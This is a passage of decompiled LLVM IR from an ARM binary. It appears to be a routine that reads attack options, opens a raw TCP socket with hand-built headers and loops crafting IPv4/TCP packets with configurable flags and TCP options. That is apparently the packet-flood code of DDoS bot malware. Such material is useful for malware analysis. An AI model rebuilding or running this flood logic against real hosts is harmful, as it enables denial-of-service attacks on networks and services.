  store i32 %v0_ca48, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_ca40, i32* @r6, align 4
  %v0_ca58 = load i32, i32* @r4, align 4
  store i32 %v0_ca58, i32* %r0.global-to-local, align 4
  %v4_ca5c = inttoptr i32 %v0_ca48 to i32*
  %v5_ca5c = call i32 @function_85e0(i32 %v0_ca58, i32* %v4_ca5c, i32 17, i32 65535)
  %v0_ca60 = load i32, i32* @r5, align 4
  store i32 %v0_ca60, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca70 = load i32, i32* @r4, align 4
  store i32 %v0_ca70, i32* %r0.global-to-local, align 4
  %v5_ca74 = inttoptr i32 %v0_ca60 to i32*
  %v6_ca74 = call i32 @function_85e0(i32 %v0_ca70, i32* %v5_ca74, i32 18, i32 0)
  %v0_ca78 = load i32, i32* @r5, align 4
  store i32 %v0_ca78, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca88 = load i32, i32* @r4, align 4
  store i32 %v0_ca88, i32* %r0.global-to-local, align 4
  %v5_ca8c = inttoptr i32 %v0_ca78 to i32*
  %v6_ca8c = call i32 @function_85e0(i32 %v0_ca88, i32* %v5_ca8c, i32 11, i32 0)
  %v0_ca90 = load i32, i32* @r5, align 4
  store i32 %v0_ca90, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_caa0 = load i32, i32* @r4, align 4
  store i32 %v0_caa0, i32* %r0.global-to-local, align 4
  %v5_caa4 = inttoptr i32 %v0_ca90 to i32*
  %v6_caa4 = call i32 @function_85e0(i32 %v0_caa0, i32* %v5_caa4, i32 12, i32 0)
  %v0_caa8 = load i32, i32* @r5, align 4
  store i32 %v0_caa8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cab8 = load i32, i32* @r4, align 4
  store i32 %v0_cab8, i32* %r0.global-to-local, align 4
  %v5_cabc = inttoptr i32 %v0_caa8 to i32*
  %v6_cabc = call i32 @function_85e0(i32 %v0_cab8, i32* %v5_cabc, i32 13, i32 0)
  %v0_cac0 = load i32, i32* @r5, align 4
  store i32 %v0_cac0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cad0 = load i32, i32* @r4, align 4
  store i32 %v0_cad0, i32* %r0.global-to-local, align 4
  %v5_cad4 = inttoptr i32 %v0_cac0 to i32*
  %v6_cad4 = call i32 @function_85e0(i32 %v0_cad0, i32* %v5_cad4, i32 14, i32 0)
  %v0_cad8 = load i32, i32* @r5, align 4
  store i32 %v0_cad8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cae8 = load i32, i32* @r4, align 4
  store i32 %v0_cae8, i32* %r0.global-to-local, align 4
  %v5_caec = inttoptr i32 %v0_cad8 to i32*
  %v6_caec = call i32 @function_85e0(i32 %v0_cae8, i32* %v5_caec, i32 15, i32 1)
  %v0_caf0 = load i32, i32* @r5, align 4
  store i32 %v0_caf0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cb00 = load i32, i32* @r4, align 4
  store i32 %v0_cb00, i32* %r0.global-to-local, align 4
  %v5_cb04 = inttoptr i32 %v0_caf0 to i32*
  %v6_cb04 = call i32 @function_85e0(i32 %v0_cb00, i32* %v5_cb04, i32 16, i32 0)
  %v2_cb10 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_cb10, i32* %r3.global-to-local, align 4
  %v0_cb14 = load i32, i32* @r5, align 4
  store i32 %v0_cb14, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_cb1c = load i32, i32* @r4, align 4
  store i32 %v0_cb1c, i32* %r0.global-to-local, align 4
  %v5_cb20 = inttoptr i32 %v0_cb14 to i32*
  %v6_cb20 = call i32 @function_8574(i32 %v0_cb1c, i32* %v5_cb20, i32 25, i32 %v2_cb10, i32 %v6_cb04)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cb34 = call i32 @function_123e0(i32 2, i32 3, i32 6)
  store i32 %v3_cb34, i32* %r0.global-to-local, align 4
  %v7_cb38 = icmp eq i32 %v3_cb34, -1
  store i1 %v7_cb38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_cb34, i32* %sb.global-to-local, align 4
  br i1 %v7_cb38, label %dec_label_pc_d0ac, label %dec_label_pc_cb44

dec_label_pc_cb44:                                ; preds = %dec_label_pc_c96c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_cb4c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_cb4c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_cb60 = call i32 @function_123b0(i32 %v3_cb34, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_cb60, i32* %r0.global-to-local, align 4
  %v7_cb64 = icmp eq i32 %v6_cb60, -1
  store i1 %v7_cb64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cb64, label %dec_label_pc_d0a4, label %dec_label_pc_cb6c

dec_label_pc_cb6c:                                ; preds = %dec_label_pc_cb44
  %v3_cb70 = mul i32 %v7_c9c8, 65536
  store i32 %v3_cb70, i32* %r4.global-to-local, align 4
  %v3_cb74 = urem i32 %v7_c9c8, 65536
  %v0_cb84 = load i32, i32* @r7, align 4
  %v3_cb84 = mul i32 %v0_cb84, 65536
  store i32 %v3_cb84, i32* %r0.global-to-local, align 4
  %v0_cb88 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_cb90 = urem i32 %v0_cb84, 65536
  store i32 %v3_cb90, i32* %ip.global-to-local, align 4
  %v3_cb94 = urem i32 %v0_cb88, 65536
  store i32 %v3_cb94, i32* %r2.global-to-local, align 4
  %v1_cb98 = urem i32 %v6_ca8c, 256
  store i32 %v1_cb98, i32* %r3.global-to-local, align 4
  %v0_cb9c = load i32, i32* @sl, align 4
  %v2_cb9c = icmp eq i32 %v0_cb9c, 0
  store i1 %v2_cb9c, i1* %cpsr_z.global-to-local, align 1
  %tmp69 = icmp slt i32 %v0_cb9c, 1
  br i1 %tmp69, label %dec_label_pc_ce50, label %dec_label_pc_cbb0

dec_label_pc_cbb0:                                ; preds = %dec_label_pc_cb6c
  %v3_cbb8 = mul i32 %v5_ca5c, 65536
  store i32 %v3_cbb8, i32* @lr, align 4
  %v1_cbc8 = urem i32 %v0_cb88, 256
  %tmp70 = udiv i32 %v0_cb84, 256
  %v3_cbcc = urem i32 %tmp70, 256
  %v1_cbd0 = urem i32 %v0_cb84, 256
  %v4_cbd4 = mul nuw nsw i32 %v1_cbd0, 256
  %v5_cbd4 = or i32 %v4_cbd4, %v3_cbcc
  store i32 %v5_cbd4, i32* @r7, align 4
  %tmp71 = udiv i32 %v7_c9c8, 256
  %tmp72 = mul i32 %v5_ca5c, 256
  %v1_cbf0 = and i32 %tmp72, 65280
  %v1_cbf4 = urem i32 %v6_ca8c, 2
  %v3_cbf8 = mul nuw nsw i32 %v1_cbc8, 256
  store i32 %v3_cbf8, i32* %r1.global-to-local, align 4
  %v5_cbfc = trunc i32 %tmp71 to i8
  %tmp73 = udiv i32 %v0_cb88, 256
  %v4_cc00 = urem i32 %tmp73, 256
  %v5_cc00 = or i32 %v4_cc00, %v3_cbf8
  store i32 %v5_cc00, i32* @r6, align 4
  %v1_cc04 = urem i32 %v6_caa4, 2
  %v1_cc08 = urem i32 %v6_cabc, 2
  %tmp74 = udiv i32 %v5_ca5c, 256
  %v4_cc0c = urem i32 %tmp74, 256
  %v5_cc0c = or i32 %v4_cc0c, %v1_cbf0
  store i32 %v5_cc0c, i32* @r5, align 4
  %v1_cc2c = urem i32 %v6_cad4, 2
  %v1_cc30 = urem i32 %v6_caec, 2
  %v1_cc3c = urem i32 %v6_cb04, 2
  store i32 %v1_cc3c, i32* %r0.global-to-local, align 4
  %v3_cc40 = udiv i32 %v7_c9c8, 65536
  store i32 %v3_cc40, i32* %r2.global-to-local, align 4
  store i32 %v1_cbd0, i32* %r3.global-to-local, align 4
  store i32 %v1_cbc8, i32* %ip.global-to-local, align 4
  %v5_cc58 = trunc i32 %v0_cb88 to i8
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_c9e0, 16777216
  %v4_cca8 = sdiv i32 %sext, 16777216
  %tmp = sub nsw i32 0, %v1_cbf4
  %v4_cd1c = and i32 %tmp, 32
  %tmp78 = sub nsw i32 0, %v1_cc04
  %v4_cd30 = and i32 %tmp78, 16
  %tmp79 = sub nsw i32 0, %v1_cc08
  %v4_cd44 = and i32 %tmp79, 8
  %tmp80 = sub nsw i32 0, %v1_cc2c
  %v4_cd58 = and i32 %tmp80, 4
  %tmp81 = sub nsw i32 0, %v1_cc30
  %v3_cd6c = and i32 %tmp81, 2
  %v7_cd9c = sext i8 %v5_cc58 to i32
  %sext77 = mul i32 %v0_cb84, 16777216
  %v3_cd9c = sdiv i32 %sext77, 16777216
  br label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %bb76, %dec_label_pc_cbb0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_cc68 = call i32 @function_126cc(i32 128, i32 1)
  store i32 %v2_cc68, i32* %r0.global-to-local, align 4
  %v3_cc6c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cc6c, i32* %r2.global-to-local, align 4
  %v1_cc70 = load i32, i32* %fp.global-to-local, align 4
  %v2_cc70 = load i32, i32* @r4, align 4
  %v5_cc70 = mul i32 %v2_cc70, 4
  %v6_cc70 = add i32 %v5_cc70, %v1_cc70
  %v7_cc70 = inttoptr i32 %v6_cc70 to i32*
  store i32 %v2_cc68, i32* %v7_cc70, align 4
  %v0_cc74 = load i32, i32* %fp.global-to-local, align 4
  %v1_cc74 = load i32, i32* %r2.global-to-local, align 4
  %v4_cc74 = mul i32 %v1_cc74, 4
  %v5_cc74 = add i32 %v4_cc74, %v0_cc74
  %v6_cc74 = inttoptr i32 %v5_cc74 to i32*
  %v7_cc74 = load i32, i32* %v6_cc74, align 4
  store i32 %v7_cc74, i32* %r4.global-to-local, align 4
  %v1_cc78 = inttoptr i32 %v7_cc74 to i8*
  %v2_cc78 = load i8, i8* %v1_cc78, align 1
  %tmp82 = urem i8 %v2_cc78, 16
  %v1_cc7c = zext i8 %tmp82 to i32
  %v1_cc80 = or i32 %v1_cc7c, 64
  store i32 %v1_cc80, i32* %r3.global-to-local, align 4
  %v1_cc84 = trunc i32 %v1_cc80 to i8
  store i8 %v1_cc84, i8* %v1_cc78, align 1
  %v0_cc88 = load i32, i32* %r4.global-to-local, align 4
  %v1_cc88 = inttoptr i32 %v0_cc88 to i8*
  %v2_cc88 = load i8, i8* %v1_cc88, align 1
  %v1_cc8c = and i8 %v2_cc88, -16
  %v1_cc90 = or i8 %v1_cc8c, 5
  store i32 %v1_ca0c, i32* %r0.global-to-local, align 4
  store i8 %v1_cc90, i8* %v1_cc88, align 1
  %v2_cca0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cca0 = add i32 %v2_cca0, 1
  %v4_cca0 = inttoptr i32 %v3_cca0 to i8*
  store i8 %v5_c9c4, i8* %v4_cca0, align 1
  store i32 %v4_cca8, i32* %r2.global-to-local, align 4
  %v2_ccac = load i32, i32* %r4.global-to-local, align 4
  %v3_ccac = add i32 %v2_ccac, 4
  %v4_ccac = inttoptr i32 %v3_ccac to i8*
  store i8 %v5_cbfc, i8* %v4_ccac, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_ccb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_ccb8 = icmp eq i32 %v0_ccb8, 0
  store i1 %v2_ccb8, i1* %cpsr_z.global-to-local, align 1
  %v2_ccbc = load i32, i32* %r4.global-to-local, align 4
  %v3_ccbc = add i32 %v2_ccbc, 3
  %v4_ccbc = inttoptr i32 %v3_ccbc to i8*
  store i8 60, i8* %v4_ccbc, align 1
  store i32 %v3_cc40, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ccc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccc8 = trunc i32 %v0_ccc8 to i8
  %v2_ccc8 = load i32, i32* %r4.global-to-local, align 4
  %v3_ccc8 = add i32 %v2_ccc8, 8
  %v4_ccc8 = inttoptr i32 %v3_ccc8 to i8*
  store i8 %v1_ccc8, i8* %v4_ccc8, align 1
  %v0_cccc = load i32, i32* %ip.global-to-local, align 4
  %v1_cccc = trunc i32 %v0_cccc to i8
  %v2_cccc = load i32, i32* %r4.global-to-local, align 4
  %v3_cccc = add i32 %v2_cccc, 9
  %v4_cccc = inttoptr i32 %v3_cccc to i8*
  store i8 %v1_cccc, i8* %v4_cccc, align 1
  %v0_ccd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_ccd0 = trunc i32 %v0_ccd0 to i8
  %v2_ccd0 = load i32, i32* %r4.global-to-local, align 4
  %v3_ccd0 = add i32 %v2_ccd0, 2
  %v4_ccd0 = inttoptr i32 %v3_ccd0 to i8*
  store i8 %v1_ccd0, i8* %v4_ccd0, align 1
  %v3_ccd4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccd4, i32* %r2.global-to-local, align 4
  %v0_ccd8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ccd8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_cc60
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ccdc = load i32, i32* %r4.global-to-local, align 4
  %v4_ccdc = add i32 %v3_ccdc, 6
  %v5_ccdc = inttoptr i32 %v4_ccdc to i8*
  store i8 64, i8* %v5_ccdc, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cc60, %bb
  %v0_cce0 = load i32, i32* %r0.global-to-local, align 4
  %v1_cce0 = trunc i32 %v0_cce0 to i8
  %v2_cce0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cce0 = add i32 %v2_cce0, 5
  %v4_cce0 = inttoptr i32 %v3_cce0 to i8*
  store i8 %v1_cce0, i8* %v4_cce0, align 1
  %v0_cce4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cce4, label %.thread9, label %bb75

.thread9:                                         ; preds = %.thread
  store i32 %v6_cb20, i32* %r0.global-to-local, align 4
  br label %bb76

bb75:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_cb20, i32* %r0.global-to-local, align 4
  %v3_ccec = load i32, i32* %r4.global-to-local, align 4
  %v4_ccec = add i32 %v3_ccec, 7
  %v5_ccec = inttoptr i32 %v4_ccec to i8*
  store i8 0, i8* %v5_ccec, align 1
  %v0_ccf4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb76

bb76:                                             ; preds = %.thread9, %bb75
  %v0_ccf4 = phi i32 [ %v6_cb20, %.thread9 ], [ %v0_ccf4.pre, %bb75 ]
  %v0_ccf0 = load i32, i32* %r2.global-to-local, align 4
  %v3_ccf0 = mul i32 %v0_ccf0, 32
  store i32 %v3_ccf0, i32* %r3.global-to-local, align 4
  %v1_ccf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_ccf4 = add i32 %v1_ccf4, 12
  %v3_ccf4 = inttoptr i32 %v2_ccf4 to i32*
  store i32 %v0_ccf4, i32* %v3_ccf4, align 4
  %v0_ccf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ccf8 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_ccf8, -8
  %v5_ccf8 = add i32 %v0_ccf8, %tmp83
  %v1_ccfc = load i32, i32* @r8, align 4
  %v2_ccfc = add i32 %v1_ccfc, %v5_ccf8
  store i32 %v2_ccfc, i32* %r3.global-to-local, align 4
  %v1_cd00 = add i32 %v2_ccfc, 16
  %v2_cd00 = inttoptr i32 %v1_cd00 to i32*
  %v3_cd00 = load i32, i32* %v2_cd00, align 4
  store i32 %v3_cd00, i32* %r2.global-to-local, align 4
  %v0_cd04 = load i32, i32* @r7, align 4
  %v1_cd04 = trunc i32 %v0_cd04 to i8
  %v2_cd04 = load i32, i32* %r4.global-to-local, align 4
  %v3_cd04 = add i32 %v2_cd04, 20
  %v4_cd04 = inttoptr i32 %v3_cd04 to i8*
  store i8 %v1_cd04, i8* %v4_cd04, align 1
  %v0_cd08 = load i32, i32* %r2.global-to-local, align 4
  %v1_cd08 = load i32, i32* %r4.global-to-local, align 4
  %v2_cd08 = add i32 %v1_cd08, 16
  %v3_cd08 = inttoptr i32 %v2_cd08 to i32*
  store i32 %v0_cd08, i32* %v3_cd08, align 4
  %v0_cd0c = load i32, i32* %r4.global-to-local, align 4
  %v1_cd0c = add i32 %v0_cd0c, 20
  store i32 %v1_cd0c, i32* %r1.global-to-local, align 4
  %v1_cd10 = add i32 %v0_cd0c, 33
  %v2_cd10 = inttoptr i32 %v1_cd10 to i8*
  %v3_cd10 = load i8, i8* %v2_cd10, align 1
  %v4_cd10 = zext i8 %v3_cd10 to i32
  store i32 %v1_cbf4, i32* %r2.global-to-local, align 4
  %v1_cd18 = and i32 %v4_cd10, 223
  %v5_cd1c = or i32 %v1_cd18, %v4_cd1c
  store i32 %v5_cd1c, i32* %r3.global-to-local, align 4
  %v1_cd20 = trunc i32 %v5_cd1c to i8
  store i8 %v1_cd20, i8* %v2_cd10, align 1
  %v0_cd24 = load i32, i32* %r1.global-to-local, align 4
  %v1_cd24 = add i32 %v0_cd24, 13
  %v2_cd24 = inttoptr i32 %v1_cd24 to i8*
  %v3_cd24 = load i8, i8* %v2_cd24, align 1
  %v4_cd24 = zext i8 %v3_cd24 to i32
  store i32 %v1_cc04, i32* %r3.global-to-local, align 4
  %v1_cd2c = and i32 %v4_cd24, 239
  %v5_cd30 = or i32 %v1_cd2c, %v4_cd30
  store i32 %v5_cd30, i32* %r2.global-to-local, align 4
  %v1_cd34 = trunc i32 %v5_cd30 to i8
  store i8 %v1_cd34, i8* %v2_cd24, align 1
  %v0_cd38 = load i32, i32* %r1.global-to-local, align 4
  %v1_cd38 = add i32 %v0_cd38, 13
  %v2_cd38 = inttoptr i32 %v1_cd38 to i8*
  %v3_cd38 = load i8, i8* %v2_cd38, align 1
  %v4_cd38 = zext i8 %v3_cd38 to i32
  store i32 %v1_cc08, i32* %ip.global-to-local, align 4
  %v1_cd40 = and i32 %v4_cd38, 247
  %v5_cd44 = or i32 %v1_cd40, %v4_cd44
  store i32 %v5_cd44, i32* %r3.global-to-local, align 4
  %v1_cd48 = trunc i32 %v5_cd44 to i8
  store i8 %v1_cd48, i8* %v2_cd38, align 1
  %v0_cd4c = load i32, i32* %r1.global-to-local, align 4
  %v1_cd4c = add i32 %v0_cd4c, 13
  %v2_cd4c = inttoptr i32 %v1_cd4c to i8*
  %v3_cd4c = load i8, i8* %v2_cd4c, align 1
  %v4_cd4c = zext i8 %v3_cd4c to i32
  store i32 %v1_cc2c, i32* %r0.global-to-local, align 4
  %v1_cd54 = and i32 %v4_cd4c, 251
  %v5_cd58 = or i32 %v1_cd54, %v4_cd58
  store i32 %v5_cd58, i32* %r2.global-to-local, align 4
  %v1_cd5c = trunc i32 %v5_cd58 to i8
  store i8 %v1_cd5c, i8* %v2_cd4c, align 1
  %v0_cd60 = load i32, i32* %r1.global-to-local, align 4
  %v1_cd60 = add i32 %v0_cd60, 13
  %v2_cd60 = inttoptr i32 %v1_cd60 to i8*
  %v3_cd60 = load i8, i8* %v2_cd60, align 1
  %v4_cd60 = zext i8 %v3_cd60 to i32
  store i32 %v1_cc30, i32* %r2.global-to-local, align 4
  %v1_cd68 = and i32 %v4_cd60, 253
  %v4_cd6c = or i32 %v1_cd68, %v3_cd6c
  store i32 %v4_cd6c, i32* %r3.global-to-local, align 4
  %v1_cd70 = trunc i32 %v4_cd6c to i8
  store i8 %v1_cd70, i8* %v2_cd60, align 1
  %v0_cd74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cd74 = add i32 %v0_cd74, 12
  %v2_cd74 = inttoptr i32 %v1_cd74 to i8*
  %v3_cd74 = load i8, i8* %v2_cd74, align 1
  %v4_cd74 = zext i8 %v3_cd74 to i32
  store i32 %v4_cd74, i32* %r2.global-to-local, align 4
  %v1_cd78 = add i32 %v0_cd74, 13
  %v2_cd78 = inttoptr i32 %v1_cd78 to i8*
  %v3_cd78 = load i8, i8* %v2_cd78, align 1
  %v4_cd78 = zext i8 %v3_cd78 to i32
  %tmp84 = urem i8 %v3_cd74, 16
  %v1_cd80 = zext i8 %tmp84 to i32
  %v1_cd84 = and i32 %v4_cd78, 254
  %v2_cd88 = or i32 %v1_cd84, %v1_cc3c
  %v1_cd8c = or i32 %v1_cd80, 160
  store i32 %v1_cd8c, i32* %r2.global-to-local, align 4
  %v1_cd90 = trunc i32 %v2_cd88 to i8
  store i8 %v1_cd90, i8* %v2_cd78, align 1
  %v0_cd94 = load i32, i32* %r2.global-to-local, align 4
  %v1_cd94 = trunc i32 %v0_cd94 to i8
  %v2_cd94 = load i32, i32* %r1.global-to-local, align 4
  %v3_cd94 = add i32 %v2_cd94, 12
  %v4_cd94 = inttoptr i32 %v3_cd94 to i8*
  store i8 %v1_cd94, i8* %v4_cd94, align 1
  store i32 %v3_cd9c, i32* %r0.global-to-local, align 4
  store i32 %v7_cd9c, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_cda8 = load i32, i32* %r1.global-to-local, align 4
  %v3_cda8 = add i32 %v2_cda8, 3
  %v4_cda8 = inttoptr i32 %v3_cda8 to i8*
  store i8 %v5_cc58, i8* %v4_cda8, align 1
  %v0_cdac = load i32, i32* %r0.global-to-local, align 4
  %v1_cdac = trunc i32 %v0_cdac to i8
  %v2_cdac = load i32, i32* %r1.global-to-local, align 4
  %v3_cdac = add i32 %v2_cdac, 1
  %v4_cdac = inttoptr i32 %v3_cdac to i8*
  store i8 %v1_cdac, i8* %v4_cdac, align 1
  %v0_cdb0 = load i32, i32* @r6, align 4
  %v1_cdb0 = trunc i32 %v0_cdb0 to i8
  %v2_cdb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_cdb0 = add i32 %v2_cdb0, 2
  %v4_cdb0 = inttoptr i32 %v3_cdb0 to i8*
  store i8 %v1_cdb0, i8* %v4_cdb0, align 1
  %v0_cdb4 = load i32, i32* @r5, align 4
  %v1_cdb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_cdb4 = add i32 %v1_cdb4, 4
  %v3_cdb4 = inttoptr i32 %v2_cdb4 to i32*
  store i32 %v0_cdb4, i32* %v3_cdb4, align 4
  %v0_cdb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_cdb8 = trunc i32 %v0_cdb8 to i8
  %v2_cdb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_cdb8 = add i32 %v2_cdb8, 41
  %v4_cdb8 = inttoptr i32 %v3_cdb8 to i8*
  store i8 %v1_cdb8, i8* %v4_cdb8, align 1
  %v0_cdbc = load i32, i32* %r3.global-to-local, align 4
  %v1_cdbc = trunc i32 %v0_cdbc to i8
  %v2_cdbc = load i32, i32* %r4.global-to-local, align 4
  %v3_cdbc = add i32 %v2_cdbc, 40
  %v4_cdbc = inttoptr i32 %v3_cdbc to i8*
  store i8 %v1_cdbc, i8* %v4_cdbc, align 1
  %v0_cdc0 = call i32 @function_e978()
  %v1_cdc4 = mul i32 %v0_cdc0, 256
  %v1_cdc8 = and i32 %v1_cdc4, 3840
  %v1_cdcc = or i32 %v1_cdc8, 28672
  %v3_cdd4 = add nuw nsw i32 %v1_cdcc, 2048
  %v3_cde07 = udiv i32 %v3_cdd4, 256
  store i32 %v3_cde07, i32* %r1.global-to-local, align 4
  %v0_cde4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cde4 = add i32 %v0_cde4, 42
  store i32 %v1_cde4, i32* %r2.global-to-local, align 4
  %v4_cde8 = inttoptr i32 %v1_cde4 to i8*
  store i8 5, i8* %v4_cde8, align 1
  %v0_cdec = load i32, i32* %r1.global-to-local, align 4
  %v1_cdec = trunc i32 %v0_cdec to i8
  %v2_cdec = load i32, i32* %r2.global-to-local, align 4
  %v3_cdec = add i32 %v2_cdec, 1
  %v4_cdec = inttoptr i32 %v3_cdec to i8*
  store i8 %v1_cdec, i8* %v4_cdec, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_cdf8 = load i32, i32* %r4.global-to-local, align 4
  %v3_cdf8 = add i32 %v2_cdf8, 47
  %v4_cdf8 = inttoptr i32 %v3_cdf8 to i8*
  store i8 10, i8* %v4_cdf8, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ce04 = load i32, i32* %r3.global-to-local, align 4
  %v1_ce04 = trunc i32 %v0_ce04 to i8
  %v2_ce04 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce04 = add i32 %v2_ce04, 46
  %v4_ce04 = inttoptr i32 %v3_ce04 to i8*
  store i8 %v1_ce04, i8* %v4_ce04, align 1
  %v0_ce08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce08 = trunc i32 %v0_ce08 to i8
  %v2_ce08 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce08 = add i32 %v2_ce08, 45
  %v4_ce08 = inttoptr i32 %v3_ce08 to i8*
  store i8 %v1_ce08, i8* %v4_ce08, align 1
  %v0_ce0c = load i32, i32* %r0.global-to-local, align 4
  %v1_ce0c = trunc i32 %v0_ce0c to i8
  %v2_ce0c = load i32, i32* %r4.global-to-local, align 4
  %v3_ce0c = add i32 %v2_ce0c, 44
  %v4_ce0c = inttoptr i32 %v3_ce0c to i8*
  store i8 %v1_ce0c, i8* %v4_ce0c, align 1
  %v0_ce10 = call i32 @function_e978()
  store i32 %v0_ce10, i32* %r0.global-to-local, align 4
  %v2_ce18 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce18 = add i32 %v2_ce18, 56
  %v4_ce18 = inttoptr i32 %v3_ce18 to i8*
  store i8 1, i8* %v4_ce18, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_ce28 = load i32, i32* %r4.global-to-local, align 4
  %v2_ce28 = add i32 %v1_ce28, 48
  %v3_ce28 = inttoptr i32 %v2_ce28 to i32*
  store i32 %v0_ce10, i32* %v3_ce28, align 4
  %v0_ce2c = load i32, i32* %r2.global-to-local, align 4
  %v1_ce2c = trunc i32 %v0_ce2c to i8
  %v2_ce2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ce2c = add i32 %v2_ce2c, 58
  %v4_ce2c = inttoptr i32 %v3_ce2c to i8*
  store i8 %v1_ce2c, i8* %v4_ce2c, align 1
  %v0_ce30 = load i32, i32* %r3.global-to-local, align 4
  %v1_ce30 = trunc i32 %v0_ce30 to i8
  %v2_ce30 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce30 = add i32 %v2_ce30, 59
  %v4_ce30 = inttoptr i32 %v3_ce30 to i8*
  store i8 %v1_ce30, i8* %v4_ce30, align 1
  %v0_ce34 = load i32, i32* %ip.global-to-local, align 4
  %v1_ce34 = load i32, i32* %r4.global-to-local, align 4
  %v2_ce34 = add i32 %v1_ce34, 52
  %v3_ce34 = inttoptr i32 %v2_ce34 to i32*
  store i32 %v0_ce34, i32* %v3_ce34, align 4
  %v0_ce38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce38 = trunc i32 %v0_ce38 to i8
  %v2_ce38 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce38 = add i32 %v2_ce38, 57
  %v4_ce38 = inttoptr i32 %v3_ce38 to i8*
  store i8 %v1_ce38, i8* %v4_ce38, align 1
  %v3_ce3c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ce3c, i32* %r3.global-to-local, align 4
  %v1_ce40 = add i32 %v3_ce3c, 1
  store i32 %v1_ce40, i32* @r4, align 4
  %v0_ce44 = load i32, i32* @sl, align 4
  %v9_ce44 = icmp eq i32 %v0_ce44, %v1_ce40
  store i1 %v9_ce44, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ce40, i32* %stack_var_-40, align 4
  %v8_ce4c = icmp sgt i32 %v0_ce44, %v1_ce40
  br i1 %v8_ce4c, label %dec_label_pc_cc60, label %dec_label_pc_ce50

dec_label_pc_ce50:                                ; preds = %bb76, %dec_label_pc_cb6c
  %v0_ce50 = phi i32 [ %v0_cb9c, %dec_label_pc_cb6c ], [ %v0_ce44, %bb76 ]
  %v2_ce50 = icmp eq i32 %v0_ce50, 0
  store i1 %v2_ce50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d008 = icmp eq i32 %v3_cb74, 65535
  %v2_d084 = icmp eq i32 %v1_cb98, 0
  %v2_ce8c = icmp eq i32 %v6_cb20, -1
  %v7_ce8c = icmp eq i32 %v6_cb20, -1
